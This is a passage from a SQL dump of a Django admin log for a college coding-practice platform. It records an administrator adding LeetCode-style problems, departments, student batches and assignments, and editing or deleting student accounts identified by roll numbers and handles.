11:00:37.930721','1126','Median of an Array in Java',1,'[{\"added\": {}}]',7,2),(3833,'2023-11-03 11:01:39.892077','1125','Mean of an Array in Java',2,'[{\"changed\": {\"fields\": [\"Solution\"]}}]',7,2),(3834,'2023-11-03 11:03:07.420471','1127','Mode of an Array in Java',1,'[{\"added\": {}}]',7,2),(3835,'2023-11-03 11:46:23.386491','1128','Variance of an Array in Java',1,'[{\"added\": {}}]',7,2),(3836,'2023-11-03 11:47:44.937196','1129','Standard Deviation of an Array in Java',1,'[{\"added\": {}}]',7,2),(3837,'2023-11-03 11:47:55.958027','1128','Variance of an Array in Java',2,'[{\"changed\": {\"fields\": [\"Solution\"]}}]',7,2),(3838,'2023-12-04 10:56:09.922825','32','Searching Problems',1,'[{\"added\": {}}]',12,2),(3839,'2023-12-04 10:58:09.885597','1130','Basic Linear Search',1,'[{\"added\": {}}]',7,2),(3840,'2023-12-04 10:59:00.637318','1131','Basic Binary Search',1,'[{\"added\": {}}]',7,2),(3841,'2023-12-04 11:00:23.540964','1132','Find the Last Occurrence of an Element',1,'[{\"added\": {}}]',7,2),(3842,'2023-12-04 11:01:16.059305','1133','Find the Second Occurrence of the Element',1,'[{\"added\": {}}]',7,2),(3843,'2023-12-04 11:02:06.498419','1134','Count Number of Occurrences',1,'[{\"added\": {}}]',7,2),(3844,'2023-12-04 11:03:59.126458','1135','Find the Closest Number in the Array',1,'[{\"added\": {}}]',7,2),(3845,'2023-12-04 11:05:00.266343','1136','Find the Missing Number in Array',1,'[{\"added\": {}}]',7,2),(3846,'2023-12-04 11:05:33.026055','1137','Find the Missing Number in Array 2',1,'[{\"added\": {}}]',7,2),(3847,'2023-12-04 11:06:20.039898','1138','Find the Missing Number in Array 3',1,'[{\"added\": {}}]',7,2),(3848,'2023-12-23 12:18:27.403057','1','Karpagam Institute of Technology',1,'[{\"added\": {}}]',27,2),(3849,'2023-12-23 12:18:44.195509','2','Karpagam College of Engineering',1,'[{\"added\": {}}]',27,2),(3850,'2023-12-23 12:18:58.163516','3','Karpagam Academy of Higher Education',1,'[{\"added\": {}}]',27,2),(3851,'2023-12-23 12:19:11.097988','1','CSE',1,'[{\"added\": {}}]',26,2),(3852,'2023-12-23 12:19:19.925978','2','IT',1,'[{\"added\": {}}]',26,2),(3853,'2023-12-23 12:19:39.874839','3','AI',1,'[{\"added\": {}}]',26,2),(3854,'2023-12-23 12:19:55.922193','4','ECE',1,'[{\"added\": {}}]',26,2),(3855,'2023-12-23 12:20:08.442035','5','EEE',1,'[{\"added\": {}}]',26,2),(3856,'2023-12-23 12:20:31.787082','6','Mech',1,'[{\"added\": {}}]',26,2),(3857,'2023-12-23 12:20:52.266893','7','CSD',1,'[{\"added\": {}}]',26,2),(3858,'2023-12-23 12:21:06.811654','8','CST',1,'[{\"added\": {}}]',26,2),(3859,'2023-12-23 12:21:14.099822','9','Cyber',1,'[{\"added\": {}}]',26,2),(3860,'2023-12-23 12:21:42.555378','1','Leet Code',1,'[{\"added\": {}}]',28,2),(3861,'2023-12-23 12:22:00.524692','1','2025',1,'[{\"added\": {}}]',25,2),(3862,'2023-12-23 12:23:00.973434','1','coordinator',1,'[{\"added\": {}}]',3,2),(3863,'2023-12-23 12:23:14.914786','2','decoder',2,'[{\"changed\": {\"fields\": [\"Groups\"]}}]',2,2),(3864,'2023-12-24 12:37:13.332868','10','Civil',1,'[{\"added\": {}}]',26,2),(3865,'2023-12-24 12:37:30.559591','11','ETE',1,'[{\"added\": {}}]',26,2),(3866,'2023-12-24 12:57:50.299043','1','Batch1',1,'[{\"added\": {}}]',36,2),(3867,'2023-12-24 12:57:53.618285','2','Batch2',1,'[{\"added\": {}}]',36,2),(3868,'2023-12-29 05:59:45.118030','3','pnr',2,'[{\"changed\": {\"fields\": [\"Staff status\", \"Superuser status\"]}}]',2,2),(3869,'2023-12-29 06:06:52.971779','1','Batch1_Assignmnet',1,'[{\"added\": {}}]',34,2),(3870,'2023-12-29 06:07:16.263027','1','Batch1_Assignmnet Longest Substring Without Repeating Characters',1,'[{\"added\": {}}]',35,2),(3871,'2023-12-29 06:07:28.020486','2','Batch1_Assignmnet Regular Expression Matching',1,'[{\"added\": {}}]',35,2),(3872,'2023-12-29 06:07:39.811312','3','Batch1_Assignmnet 4Sum',1,'[{\"added\": {}}]',35,2),(3873,'2023-12-29 06:09:01.417287','1','pnr',1,'[{\"added\": {}}]',32,2),(3874,'2023-12-29 06:16:03.503090','1','user0839VG',1,'[{\"added\": {}}]',30,2),(3875,'2023-12-29 06:31:37.898077','3','pnr',2,'[{\"changed\": {\"fields\": [\"First name\", \"Last name\"]}}]',2,2),(3876,'2023-12-29 06:32:46.188014','3','Batch1_Assignmnet First Missing Positive',2,'[{\"changed\": {\"fields\": [\"Problem\"]}}]',35,2),(3877,'2024-01-05 10:44:53.977643','85','21eca18@karpagamtech.ac.in',3,'',2,2),(3878,'2024-01-05 10:44:53.982239','94','21ecb06@karpagamtech.ac.in',3,'',2,2),(3879,'2024-01-05 10:44:53.985842','95','21ecb27',3,'',2,2),(3880,'2024-01-05 10:44:53.988924','97','21ecb31',3,'',2,2),(3881,'2024-01-05 10:44:53.993736','96','21ecb54',3,'',2,2),(3882,'2024-01-05 10:45:59.570882','103','21ada61',3,'',2,2),(3883,'2024-01-05 10:45:59.575166','102','21ada64',3,'',2,2),(3884,'2024-01-05 10:45:59.577534','107','21csa12',3,'',2,2),(3885,'2024-01-05 10:45:59.584387','109','21csa19',3,'',2,2),(3886,'2024-01-05 10:45:59.590353','106','21csa27',3,'',2,2),(3887,'2024-01-05 10:45:59.592591','110','21csa28',3,'',2,2),(3888,'2024-01-05 10:45:59.596610','105','21csa36',3,'',2,2),(3889,'2024-01-05 10:45:59.598967','108','21csa42',3,'',2,2),(3890,'2024-01-05 10:45:59.601049','111','21csa54',3,'',2,2),(3891,'2024-01-05 10:45:59.603012','104','21csa60',3,'',2,2),(3892,'2024-01-05 10:45:59.604671','118','21eca01',3,'',2,2),(3893,'2024-01-05 10:45:59.607146','115','21ECA12',3,'',2,2),(3894,'2024-01-05 10:45:59.609128','117','21eca17',3,'',2,2),(3895,'2024-01-05 10:45:59.610930','114','21ecb13',3,'',2,2),(3896,'2024-01-05 10:45:59.612821','112','21ecb20',3,'',2,2),(3897,'2024-01-05 10:45:59.614441','116','21ecb29',3,'',2,2),(3898,'2024-01-05 10:45:59.618361','126','21ecb32',3,'',2,2),(3899,'2024-01-05 10:45:59.621150','113','21ecb59',3,'',2,2),(3900,'2024-01-05 10:45:59.624466','122','21ita17',3,'',2,2),(3901,'2024-01-05 10:45:59.627901','120','21ita30',3,'',2,2),(3902,'2024-01-05 10:45:59.630526','125','21ita44',3,'',2,2),(3903,'2024-01-05 10:45:59.633123','121','21ita47',3,'',2,2),(3904,'2024-01-05 10:45:59.636507','119','21ita57',3,'',2,2),(3905,'2024-01-05 10:45:59.638910','123','21mea20',3,'',2,2),(3906,'2024-01-05 10:45:59.641028','124','21mea45',3,'',2,2),(3907,'2024-01-05 10:45:59.644852','86','22ecb10',3,'',2,2),(3908,'2024-01-06 04:28:09.666547','2','Batch1_Arrays',1,'[{\"added\": {}}]',34,2),(3909,'2024-01-06 04:28:16.120146','1','Batch1_Assignmnet',3,'',34,2),(3910,'2024-01-06 04:28:32.895913','4','Batch1_Arrays Fizz Buzz',1,'[{\"added\": {}}]',35,2),(3911,'2024-01-06 04:28:44.238111','5','Batch1_Arrays Matrix Diagonal Sum',1,'[{\"added\": {}}]',35,2),(3912,'2024-01-06 04:29:01.315370','6','Batch1_Arrays Concatenation of Array',1,'[{\"added\": {}}]',35,2),(3913,'2024-01-06 04:29:54.843199','7','Batch1_Arrays Maximum Number of Words Found in Sentences',1,'[{\"added\": {}}]',35,2),(3914,'2024-01-06 04:30:17.838432','8','Batch1_Arrays Trapping Rain Water',1,'[{\"added\": {}}]',35,2),(3915,'2024-01-06 04:31:02.423327','9','Batch1_Arrays Maximum of Absolute Value Expression',1,'[{\"added\": {}}]',35,2),(3916,'2024-01-06 04:31:45.916124','10','Batch1_Arrays Spiral Matrix II',1,'[{\"added\": {}}]',35,2),(3917,'2024-01-06 04:32:20.350477','11','Batch1_Arrays Maximum Gap',1,'[{\"added\": {}}]',35,2),(3918,'2024-01-06 04:32:37.322768','12','Batch1_Arrays Maximum Subarray',1,'[{\"added\": {}}]',35,2),(3919,'2024-01-06 04:32:51.955929','13','Batch1_Arrays Set Matrix Zeroes',1,'[{\"added\": {}}]',35,2),(3920,'2024-01-06 04:33:01.886297','14','Batch1_Arrays Next Permutation',1,'[{\"added\": {}}]',35,2),(3921,'2024-01-19 07:52:06.056999','3','Batch1_2DArrays',1,'[{\"added\": {}}]',34,2),(3922,'2024-01-19 07:52:21.545677','4','Batch1_Maths',1,'[{\"added\": {}}]',34,2),(3923,'2024-01-20 03:35:05.166114','15','Batch1_2DArrays Richest Customer Wealth',1,'[{\"added\": {}}]',35,2),(3924,'2024-01-20 03:35:14.091227','16','Batch1_2DArrays Running Sum of 1d Array',1,'[{\"added\": {}}]',35,2),(3925,'2024-01-20 03:35:26.517923','17','Batch1_2DArrays Special Positions in a Binary Matrix',1,'[{\"added\": {}}]',35,2),(3926,'2024-01-20 03:35:34.090666','18','Batch1_2DArrays Convert 1D Array Into 2D Array',1,'[{\"added\": {}}]',35,2),(3927,'2024-01-20 03:36:05.347980','19','Batch1_2DArrays Search a 2D Matrix',1,'[{\"added\": {}}]',35,2),(3928,'2024-01-20 03:36:20.037132','20','Batch1_2DArrays Range Sum Query 2D - Immutable',1,'[{\"added\": {}}]',35,2),(3929,'2024-01-20 03:36:35.652668','21','Batch1_2DArrays Max Chunks To Make Sorted',1,'[{\"added\": {}}]',35,2),(3930,'2024-01-20 03:36:50.555526','22','Batch1_2DArrays Max Chunks To Make Sorted II',1,'[{\"added\": {}}]',35,2),(3931,'2024-01-20 03:37:05.539108','23','Batch1_2DArrays Transpose Matrix',1,'[{\"added\": {}}]',35,2),(3932,'2024-01-20 03:37:31.149574','24','Batch1_2DArrays Count Negative Numbers in a Sorted Matrix',1,'[{\"added\": {}}]',35,2),(3933,'2024-01-20 03:37:37.897742','25','Batch1_2DArrays Reshape the Matrix',1,'[{\"added\": {}}]',35,2),(3934,'2024-01-20 03:37:45.315153','26','Batch1_2DArrays Matrix Diagonal Sum',1,'[{\"added\": {}}]',35,2),(3935,'2024-01-20 03:39:38.877666','27','Batch1_Maths Find Greatest Common Divisor of Array',1,'[{\"added\": {}}]',35,2),(3936,'2024-01-20 03:39:46.906777','28','Batch1_Maths Self Dividing Numbers',1,'[{\"added\": {}}]',35,2),(3937,'2024-01-20 03:39:58.973570','29','Batch1_Maths Number of Good Pairs',1,'[{\"added\": {}}]',35,2),(3938,'2024-01-20 03:40:30.963476','30','Batch1_Arrays Subtract the Product and Sum of Digits of an Integer',1,'[{\"added\": {}}]',35,2),(3939,'2024-01-20 03:41:02.987174','31','Batch1_Maths Count of Matches in Tournament',1,'[{\"added\": {}}]',35,2),(3940,'2024-01-20 03:41:15.985477','32','Batch1_Maths Max Consecutive Ones',1,'[{\"added\": {}}]',35,2),(3941,'2024-01-20 03:41:29.989609','33','Batch1_Maths Implement Rand10() Using Rand7()',1,'[{\"added\": {}}]',35,2),(3942,'2024-01-20 03:41:36.913026','34','Batch1_Maths Four Divisors',1,'[{\"added\": {}}]',35,2),(3943,'2024-01-20 03:41:54.347023','35','Batch1_Maths Day of the Week',1,'[{\"added\": {}}]',35,2),(3944,'2024-01-20 03:42:09.442479','36','Batch1_Maths Rectangle Overlap',1,'[{\"added\": {}}]',35,2),(3945,'2024-01-20 03:42:17.146247','37','Batch1_Maths Excel Sheet Column Title',1,'[{\"added\": {}}]',35,2),(3946,'2024-01-20 03:42:39.798833','5','Bit Manipulation',1,'[{\"added\": {}}]',34,2),(3947,'2024-01-20 04:20:03.703712','22','21ita17',2,'[{\"changed\": {\"fields\": [\"User handle\"]}}]',30,2),(3948,'2024-01-20 04:22:34.332936','17','21eca17',2,'[{\"changed\": {\"fields\": [\"User handle\"]}}]',30,2),(3949,'2024-01-20 04:22:45.538499','18','21eca01',2,'[{\"changed\": {\"fields\": [\"User handle\"]}}]',30,2),(3950,'2024-01-22 04:58:48.865449','68','21ecb06',2,'[{\"changed\": {\"fields\": [\"User handle\"]}}]',30,2),(3951,'2024-01-22 08:37:27.696890','6','Batch2_Prime',1,'[{\"added\": {}}]',34,2),(3952,'2024-01-22 08:38:19.859947','38','Batch2_Prime Factor Combinations',1,'[{\"added\": {}}]',35,2),(3953,'2024-01-22 08:39:56.957497','38','Batch2_Prime Factor Combinations',3,'',35,2),(3954,'2024-01-22 08:52:23.579385','7','B2_Array',1,'[{\"added\": {}}]',34,2),(3955,'2024-01-22 08:53:48.620176','39','B2_Array Running Sum of 1d Array',1,'[{\"added\": {}}]',35,2),(3956,'2024-01-22 08:53:55.342294','39','B2_Array Running Sum of 1d Array',2,'[]',35,2),(3957,'2024-01-22 08:55:02.649196','40','B2_Array Number of Good Pairs',1,'[{\"added\": {}}]',35,2),(3958,'2024-01-22 08:55:18.342439','41','B2_Array Find Greatest Common Divisor of Array',1,'[{\"added\": {}}]',35,2),(3959,'2024-01-22 08:55:35.631347','42','B2_Array Unique Number of Occurrences',1,'[{\"added\": {}}]',35,2),(3960,'2024-01-22 08:55:50.073557','43','B2_Array Divide Array Into Increasing Sequences',1,'[{\"added\": {}}]',35,2),(3961,'2024-01-22 08:56:05.967532','43','B2_Array Divide Array Into Increasing Sequences',3,'',35,2),(3962,'2024-01-22 08:56:34.549420','44','B2_Array Divide Array Into Equal Pairs',1,'[{\"added\": {}}]',35,2),(3963,'2024-01-22 08:56:46.581388','45','B2_Array Find the Duplicate Number',1,'[{\"added\": {}}]',35,2),(3964,'2024-01-22 08:56:57.629672','46','B2_Array Find All Duplicates in an Array',1,'[{\"added\": {}}]',35,2),(3965,'2024-01-22 08:57:09.055969','47','B2_Array Find Peak Element',1,'[{\"added\": {}}]',35,2),(3966,'2024-01-23 02:59:55.859341','8','B2- 2D Array 22_01_23',1,'[{\"added\": {}}]',34,2),(3967,'2024-01-23 03:01:51.079564','48','B2- 2D Array 22_01_23 Spiral Matrix II',1,'[{\"added\": {}}]',35,2),(3968,'2024-01-23 03:02:04.039009','49','B2- 2D Array 22_01_23 Richest Customer Wealth',1,'[{\"added\": {}}]',35,2),(3969,'2024-01-23 03:02:24.897431','50','B2- 2D Array 22_01_23 Toeplitz Matrix',1,'[{\"added\": {}}]',35,2),(3970,'2024-01-23 03:03:36.408666','51','B2- 2D Array 22_01_23 Matrix Diagonal Sum',1,'[{\"added\": {}}]',35,2),(3971,'2024-01-23 03:03:52.960340','52','B2- 2D Array 22_01_23 Count Negative Numbers in a Sorted Matrix',1,'[{\"added\": {}}]',35,2),(3972,'2024-01-23 03:04:14.185625','53','B2- 2D Array 22_01_23 Transpose Matrix',1,'[{\"added\": {}}]',35,2),(3973,'2024-01-23 03:04:46.605958','54','B2- 2D Array 22_01_23 Set Matrix Zeroes',1,'[{\"added\": {}}]',35,2),(3974,'2024-01-23 03:06:06.555028','55','B2- 2D Array 22_01_23 Kth Smallest Element in a Sorted Matrix',1,'[{\"added\": {}}]',35,2),(3975,'2024-01-23 03:12:08.607258','154','21csa15',2,'[{\"changed\": {\"fields\": [\"First name\", \"Last name\", \"Email address\"]}}]',2,2),(3976,'2024-01-23 03:13:05.774247','120','21csa15',1,'[{\"added\": {}}]',32,2),(3977,'2024-01-23 03:13:37.171743','120','Dhanavel_gs',1,'[{\"added\": {}}]',30,2),(3978,'2024-01-23 03:15:11.273840','249','21ita27',2,'[{\"changed\": {\"fields\": [\"First name\", \"Last name\"]}}]',2,2),(3979,'2024-01-23 03:16:02.232107','121','21ita27',1,'[{\"added\": {}}]',32,2),(3980,'2024-01-23 03:16:31.130284','121','mmanimithran',1,'[{\"added\": {}}]',30,2),(3981,'2024-01-23 03:21:27.512759','100','kasimani272004',2,'[{\"changed\": {\"fields\": [\"User handle\"]}}]',30,2),(3982,'2024-01-24 09:51:32.111482','9','B2_PRFIX SUM 24_01_24',1,'[{\"added\": {}}]',34,2),(3983,'2024-01-24 09:53:05.184501','56','B2_PRFIX SUM 24_01_24 Minimum Value to Get Positive Step by Step Sum',1,'[{\"added\": {}}]',35,2),(3984,'2024-01-24 09:53:20.396197','57','B2_PRFIX SUM 24_01_24 Find Pivot Index',1,'[{\"added\": {}}]',35,2),(3985,'2024-01-24 09:53:37.815317','58','B2_PRFIX SUM 24_01_24 Running Sum of 1d Array',1,'[{\"added\": {}}]',35,2),(3986,'2024-01-24 09:53:51.361936','59','B2_PRFIX SUM 24_01_24 Find the Highest Altitude',1,'[{\"added\": {}}]',35,2),(3987,'2024-01-24 09:54:16.413048','60','B2_PRFIX SUM 24_01_24 Minimum Size Subarray Sum',1,'[{\"added\": {}}]',35,2),(3988,'2024-01-24 09:54:27.988396','61','B2_PRFIX SUM 24_01_24 Subarray Sum Equals K',1,'[{\"added\": {}}]',35,2),(3989,'2024-01-24 09:54:50.134071','62','B2_PRFIX SUM 24_01_24 Apply Operations to Make All Array Elements Equal to Zero',1,'[{\"added\": {}}]',35,2),(3990,'2024-01-24 09:55:38.686467','63','B2_PRFIX SUM 24_01_24 Number of Submatrices That Sum to Target',1,'[{\"added\": {}}]',35,2),(3991,'2024-01-24 10:00:20.611082','230','21ita60',2,'[{\"changed\": {\"fields\": [\"Username\"]}}]',2,2),(3992,'2024-01-25 09:56:40.519158','80','Eniya_M',2,'[{\"changed\": {\"fields\": [\"User handle\"]}}]',30,2),(3993,'2024-01-29 04:50:46.750786','10','B2_Swindow_2_ptr',1,'[{\"added\": {}}]',34,2),(3994,'2024-01-29 04:51:57.592963','11','B2_Sub_arr_set_sequence',1,'[{\"added\": {}}]',34,2),(3995,'2024-01-29 04:54:51.352410','64','B2_Swindow_2_ptr Longest Nice Substring',1,'[{\"added\": {}}]',35,2),(3996,'2024-01-29 04:55:10.220382','65','B2_Swindow_2_ptr Longest Even Odd Subarray With Threshold',1,'[{\"added\": {}}]',35,2),(3997,'2024-01-29 04:55:25.350560','66','B2_Swindow_2_ptr Minimum Size Subarray Sum',1,'[{\"added\": {}}]',35,2),(3998,'2024-01-29 04:55:53.138850','67','B2_Swindow_2_ptr Max Consecutive Ones III',1,'[{\"added\": {}}]',35,2),(3999,'2024-01-29 04:56:06.766596','68','B2_Swindow_2_ptr Count Number of Nice Subarrays',1,'[{\"added\": {}}]',35,2),(4000,'2024-01-29 04:56:17.100627','69','B2_Swindow_2_ptr Is Subsequence',1,'[{\"added\": {}}]',35,2),(4001,'2024-01-29 04:56:28.405522','70','B2_Swindow_2_ptr Sort Colors',1,'[{\"added\": {}}]',35,2),(4002,'2024-01-29 04:56:40.142526','71','B2_Swindow_2_ptr Reverse Words in a String',1,'[{\"added\": {}}]',35,2),(4003,'2024-01-29 04:57:16.486792','72','B2_Sub_arr_set_sequence Minimum Size Subarray Sum',1,'[{\"added\": {}}]',35,2),(4004,'2024-01-29 04:57:28.345102','73','B2_Sub_arr_set_sequence Maximum Subarray',1,'[{\"added\": {}}]',35,2),(4005,'2024-01-29 04:57:51.174534','74','B2_Sub_arr_set_sequence Find Subsequence of Length K With the Largest Sum',1,'[{\"added\": {}}]',35,2),(4006,'2024-01-29 04:58:18.768432','75','B2_Sub_arr_set_sequence Longest Increasing Subsequence',1,'[{\"added\": {}}]',35,2),(4007,'2024-01-29 04:58:39.563081','76','B2_Sub_arr_set_sequence Subarray Sum Equals K',1,'[{\"added\": {}}]',35,2),(4008,'2024-01-29 04:58:53.132975','77','B2_Sub_arr_set_sequence Contiguous Array',1,'[{\"added\": {}}]',35,2),(4009,'2024-01-29 04:59:14.088289','78','B2_Sub_arr_set_sequence Maximum Sum of Two Non-Overlapping Subarrays',1,'[{\"added\": {}}]',35,2),(4010,'2024-01-29 04:59:26.355375','79','B2_Sub_arr_set_sequence Sum of Subsequence Widths',1,'[{\"added\": {}}]',35,2),(4011,'2024-02-05 03:46:01.796557','12','B2_RECURSION',1,'[{\"added\": {}}]',34,2),(4012,'2024-02-05 03:49:53.084759','13','B2_BIT_MANIPULATION',1,'[{\"added\": {}}]',34,2),(4013,'2024-02-05 03:51:07.085999','14','B2_SEARCHING',1,'[{\"added\": {}}]',34,2),(4014,'2024-02-05 03:53:03.477453','80','B2_RECURSION Fibonacci Number',1,'[{\"added\": {}}]',35,2),(4015,'2024-02-05 03:53:14.612560','81','B2_RECURSION Power of Two',1,'[{\"added\": {}}]',35,2),(4016,'2024-02-05 03:53:25.490316','82','B2_RECURSION Pow(x, n)',1,'[{\"added\": {}}]',35,2),(4017,'2024-02-05 03:53:34.744528','83','B2_RECURSION Elimination Game',1,'[{\"added\": {}}]',35,2),(4018,'2024-02-05 03:53:51.764737','84','B2_RECURSION K-th Symbol in Grammar',1,'[{\"added\": {}}]',35,2),(4019,'2024-02-05 03:54:12.123983','85','B2_RECURSION Count Good Numbers',1,'[{\"added\": {}}]',35,2),(4020,'2024-02-05 03:54:34.592313','86','B2_RECURSION Permutation Sequence',1,'[{\"added\": {}}]',35,2),(4021,'2024-02-05 03:54:46.900714','87','B2_RECURSION Power of Four',1,'[{\"added\": {}}]',35,2),(4022,'2024-02-05 03:55:13.707821','88','B2_BIT_MANIPULATION Single Number',1,'[{\"added\": {}}]',35,2),(4023,'2024-02-05 03:55:35.750631','89','B2_BIT_MANIPULATION Reverse Bits',1,'[{\"added\": {}}]',35,2),(4024,'2024-02-05 03:55:47.205322','90','B2_BIT_MANIPULATION Counting Bits',1,'[{\"added\": {}}]',35,2),(4025,'2024-02-05 03:56:03.142609','91','B2_BIT_MANIPULATION Number Complement',1,'[{\"added\": {}}]',35,2),(4026,'2024-02-05 03:56:13.631510','92','B2_BIT_MANIPULATION Binary Gap',1,'[{\"added\": {}}]',35,2),(4027,'2024-02-05 03:56:35.238285','93','B2_BIT_MANIPULATION Maximum Product of Word Lengths',1,'[{\"added\": {}}]',35,2),(4028,'2024-02-05 03:56:44.957191','94','B2_BIT_MANIPULATION Divide Two Integers',1,'[{\"added\": {}}]',35,2),(4029,'2024-02-05 03:56:53.494951','95','B2_BIT_MANIPULATION Can I Win',1,'[{\"added\": {}}]',35,2),(4030,'2024-02-05 03:57:33.239831','96','B2_SEARCHING Minimum Number of Days to Make m Bouquets',1,'[{\"added\": {}}]',35,2),(4031,'2024-02-05 03:57:51.079531','97','B2_SEARCHING Sum of Mutated Array Closest to Target',1,'[{\"added\": {}}]',35,2),(4032,'2024-02-05 03:58:16.398095','98','B2_SEARCHING Find the Smallest Divisor Given a Threshold',1,'[{\"added\": {}}]',35,2),(4033,'2024-02-05 03:58:25.615029','99','B2_SEARCHING Koko Eating Bananas',1,'[{\"added\": {}}]',35,2),(4034,'2024-02-05 03:59:02.255883','100','B2_SEARCHING Heaters',1,'[{\"added\": {}}]',35,2),(4035,'2024-02-05 03:59:48.464224','101','B2_SEARCHING Ugly Number III',1,'[{\"added\": {}}]',35,2),(4036,'2024-02-05 03:59:59.397240','102','B2_SEARCHING Sqrt(x)',1,'[{\"added\": {}}]',35,2),(4037,'2024-02-05 04:00:19.157940','103','B2_SEARCHING Magnetic Force Between Two Balls',1,'[{\"added\": {}}]',35,2),(4038,'2024-02-15 07:58:47.778732','122','21csa23',1,'[{\"added\": {}}]',32,2),(4039,'2024-02-15 07:59:12.021255','122','21csa23',1,'[{\"added\": {}}]',30,2),(4040,'2024-02-15 08:00:13.471442','250','21csa23',2,'[{\"changed\": {\"fields\": [\"First name\", \"Last name\"]}}]',2,2),(4041,'2024-02-15 08:01:03.783540','119','21csa39',2,'[{\"changed\": {\"fields\": [\"User handle\"]}}]',30,2),(4042,'2024-02-17 08:29:37.053247','15','B2_Assessment',1,'[{\"added\": {}}]',34,2),(4043,'2024-02-17 08:29:57.174606','104','B2_Assessment Find Minimum in Rotated Sorted Array',1,'[{\"added\": {}}]',35,2),(4044,'2024-02-17 08:31:09.303846','104','B2_Assessment Search Suggestions System',2,'[{\"changed\": {\"fields\": [\"Problem\"]}}]',35,2),(4045,'2024-02-20 08:22:52.651526','16','B2_SORTING',1,'[{\"added\": {}}]',34,2),(4046,'2024-02-20 08:24:29.122001','105','B2_SORTING Majority Element',1,'[{\"added\": {}}]',35,2),(4047,'2024-02-20 08:24:39.665191','106','B2_SORTING Contains Duplicate',1,'[{\"added\": {}}]',35,2),(4048,'2024-02-20 08:24:54.169839','107','B2_SORTING Missing Number',1,'[{\"added\": {}}]',35,2),(4049,'2024-02-20 08:25:44.857596','108','B2_SORTING Sort an Array',1,'[{\"added\": {}}]',35,2),(4050,'2024-02-20 08:25:54.026353','109','B2_SORTING Sort Colors',1,'[{\"added\": {}}]',35,2),(4051,'2024-02-20 08:26:04.889743','110','B2_SORTING Largest Number',1,'[{\"added\": {}}]',35,2),(4052,'2024-02-20 08:26:16.793822','111','B2_SORTING Remove Element',1,'[{\"added\": {}}]',35,2),(4053,'2024-02-20 08:36:32.138456','17','B2_HASHING',1,'[{\"added\": {}}]',34,2),(4054,'2024-02-20 08:38:21.135432','112','B2_HASHING Design HashMap',1,'[{\"added\": {}}]',35,2),(4055,'2024-02-20 08:39:26.491587','113','B2_HASHING Design HashSet',1,'[{\"added\": {}}]',35,2),(4056,'2024-02-20 08:39:51.494294','114','B2_HASHING Two Sum',1,'[{\"added\": {}}]',35,2),(4057,'2024-02-20 08:40:02.516645','115','B2_HASHING Jewels and Stones',1,'[{\"added\": {}}]',35,2),(4058,'2024-02-20 08:40:14.700919','116','B2_HASHING Most Common Word',1,'[{\"added\": {}}]',35,2),(4059,'2024-02-20 08:43:27.747928','117','B2_HASHING Find Common Characters',1,'[{\"added\": {}}]',35,2),(4060,'2024-02-20 08:44:22.931598','118','B2_HASHING Snapshot Array',1,'[{\"added\": {}}]',35,2),(4061,'2024-02-20 08:45:20.506581','119','B2_HASHING Making File Names Unique',1,'[{\"added\": {}}]',35,2),(4062,'2024-02-20 08:50:22.835013','18','B2_LINKED_LIST',1,'[{\"added\": {}}]',34,2),(4063,'2024-02-20 08:53:22.592506','120','B2_LINKED_LIST Reverse Linked List',1,'[{\"added\": {}}]',35,2),(4064,'2024-02-20 08:53:49.593393','121','B2_LINKED_LIST Palindrome Linked List',1,'[{\"added\": {}}]',35,2),(4065,'2024-02-20 08:55:57.136948','122','B2_LINKED_LIST Middle of the Linked List',1,'[{\"added\": {}}]',35,2),(4066,'2024-02-20 08:56:23.348752','123','B2_LINKED_LIST Remove Nth Node From End of List',1,'[{\"added\": {}}]',35,2),(4067,'2024-02-20 08:56:57.530382','124','B2_LINKED_LIST Reverse Linked List II',1,'[{\"added\": {}}]',35,2),(4068,'2024-02-20 08:57:07.970842','125','B2_LINKED_LIST Merge Two Sorted Lists',1,'[{\"added\": {}}]',35,2),(4069,'2024-02-20 08:57:20.762517','126','B2_LINKED_LIST Intersection of Two Linked Lists',1,'[{\"added\": {}}]',35,2),(4070,'2024-02-20 08:59:39.642561','19','B2_LINKED_LIST2',1,'[{\"added\": {}}]',34,2),(4071,'2024-02-20 09:01:50.803873','127','B2_LINKED_LIST2 Linked List Cycle',1,'[{\"added\": {}}]',35,2),(4072,'2024-02-20 09:02:30.031988','128','B2_LINKED_LIST2 Remove Linked List Elements',1,'[{\"added\": {}}]',35,2),(4073,'2024-02-20 09:02:56.923362','129','B2_LINKED_LIST2 Rotate List',1,'[{\"added\": {}}]',35,2),(4074,'2024-02-20 09:03:08.460605','130','B2_LINKED_LIST2 Reorder List',1,'[{\"added\": {}}]',35,2),(4075,'2024-02-20 09:08:35.348548','131','B2_LINKED_LIST2 Delete Node in a Linked List',1,'[{\"added\": {}}]',35,2),(4076,'2024-02-20 09:10:27.004272','132','B2_LINKED_LIST2 Swapping Nodes in a Linked List',1,'[{\"added\": {}}]',35,2),(4077,'2024-02-20 09:11:03.942781','133','B2_LINKED_LIST2 LRU Cache',1,'[{\"added\": {}}]',35,2),(4078,'2024-02-20 09:11:19.508747','134','B2_LINKED_LIST2 Odd Even Linked List',1,'[{\"added\": {}}]',35,2),(4079,'2024-02-27 08:52:09.287959','20','Stack and Queue',1,'[{\"added\": {}}]',34,2),(4080,'2024-02-27 08:52:29.796556','20','B2_STACK & QUEUE',2,'[{\"changed\": {\"fields\": [\"Name\"]}}]',34,2),(4081,'2024-02-27 08:53:34.333348','20','B2_STACK & QUEUE',2,'[]',34,2),(4082,'2024-02-27 08:53:45.313003','21','B2_TREE',1,'[{\"added\": {}}]',34,2),(4083,'2024-02-27 08:55:27.002760','22','B2_TREEVIEW',1,'[{\"added\": {}}]',34,2),(4084,'2024-02-27 08:56:18.816983','135','B2_STACK & QUEUE Valid Parentheses',1,'[{\"added\": {}}]',35,2),(4085,'2024-02-27 08:56:34.942170','136','B2_STACK & QUEUE Implement Stack using Queues',1,'[{\"added\": {}}]',35,2),(4086,'2024-02-27 08:56:54.037181','137','B2_STACK & QUEUE Implement Queue using Stacks',1,'[{\"added\": {}}]',35,2),(4087,'2024-02-27 08:57:07.918680','138','B2_STACK & QUEUE Next Greater Element I',1,'[{\"added\": {}}]',35,2),(4088,'2024-02-27 08:57:20.852797','139','B2_STACK & QUEUE Asteroid Collision',1,'[{\"added\": {}}]',35,2),(4089,'2024-02-27 08:57:32.472442','140','B2_STACK & QUEUE Sliding Window Maximum',1,'[{\"added\": {}}]',35,2),(4090,'2024-02-27 08:57:59.633104','141','B2_STACK & QUEUE Flatten Nested List Iterator',1,'[{\"added\": {}}]',35,2),(4091,'2024-02-27 08:58:09.668851','142','B2_STACK & QUEUE Trapping Rain Water',1,'[{\"added\": {}}]',35,2),(4092,'2024-02-27 08:58:33.584758','143','B2_TREE Same 